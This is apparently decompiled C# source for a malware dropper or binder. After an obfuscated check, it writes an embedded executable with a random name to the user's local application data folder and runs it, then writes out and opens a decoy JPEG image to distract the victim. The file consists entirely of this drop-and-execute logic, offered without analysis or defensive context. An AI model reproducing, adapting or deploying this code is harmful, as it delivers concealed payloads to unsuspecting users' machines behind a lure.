using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using ns8;

namespace ns0;

internal static class Class0
{
	private static void Main()
	{
		if (!Class28.smethod_3())
		{
			return;
		}
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "PxRDxkNimM.exe", (byte[])resourceManager.GetObject("eUwjJHU_pC"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "PxRDxkNimM.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "LVwpiCakBG.jpg", (byte[])resourceManager.GetObject("eWSHhBzcgI"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "LVwpiCakBG.jpg");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
